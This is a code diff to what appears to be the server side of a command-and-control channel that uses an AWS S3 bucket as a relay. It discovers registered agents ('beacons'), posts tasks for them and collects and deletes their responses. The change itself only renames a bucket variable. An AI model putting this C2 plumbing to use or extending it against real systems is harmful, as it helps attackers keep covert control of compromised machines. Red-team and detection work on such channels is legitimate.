@@ -10,7 +10,7 @@ from pprint import pprint
 # This should be the same across server/client.
 AWS_SECRET_KEY = 'YOUR-SECRET-KEY'
 AWS_ACCESS_KEY = 'YOUR-ACCESS-KEY'
-bucketName = 'S3-BUCKET-NAME'
+AWS_BUCKET_NAME = 'S3-BUCKET-NAME'
 taskKeyName = 'TaskForYou'
 respKeyName = 'RespForYou'
 
@@ -21,20 +21,20 @@ def prepTransport():
 
 def sendData(data, beaconId):
     keyName = "{}:{}:{}".format(beaconId, taskKeyName, str(uuid.uuid4()))
-    s3.put_object(Body=data, Bucket=bucketName, Key=keyName)
+    s3.put_object(Body=data, Bucket=AWS_BUCKET_NAME, Key=keyName)
 
 def retrieveData(beaconId):
     keyName = "{}:{}".format(beaconId, respKeyName)
     while True:
         try:
-            resp = s3.list_objects(Bucket=bucketName, Prefix=keyName)
+            resp = s3.list_objects(Bucket=AWS_BUCKET_NAME, Prefix=keyName)
             objects = resp['Contents']
             if objects:
                 taskResponses = []
                 for obj in objects:
-                    resp = s3.get_object(Bucket=bucketName, Key=obj['Key'])
+                    resp = s3.get_object(Bucket=AWS_BUCKET_NAME, Key=obj['Key'])
                     msg = resp['Body'].read()
-                    s3.delete_object(Bucket=bucketName, Key=obj['Key'])
+                    s3.delete_object(Bucket=AWS_BUCKET_NAME, Key=obj['Key'])
                     taskResponses.append(msg)
                 return taskResponses
         except ClientError as e:
@@ -59,7 +59,7 @@ def fetchNewBeacons():
     """
     try:
         # http://boto3.readthedocs.io/en/latest/reference/services/s3.html#S3.Client.list_objects
-        resp = s3.list_objects(Bucket=bucketName)
+        resp = s3.list_objects(Bucket=AWS_BUCKET_NAME)
         objects = resp['Contents']
         beacons = []
         # beacons = [obj.split(':')[1] for obj in objects if 'AGENT:' in obj['Key']]
@@ -68,7 +68,7 @@ def fetchNewBeacons():
                 beaconId = obj['Key'].split(':')[1]
                 print( '[ + ] Discovered new Agent in bucket: {}'.format(beaconId))
                 # Remove the beacon registration
-                s3.delete_object(Bucket=bucketName, Key=obj['Key'])
+                s3.delete_object(Bucket=AWS_BUCKET_NAME, Key=obj['Key'])
                 # append beacon
                 beacons.append(beaconId)
         if beacons:
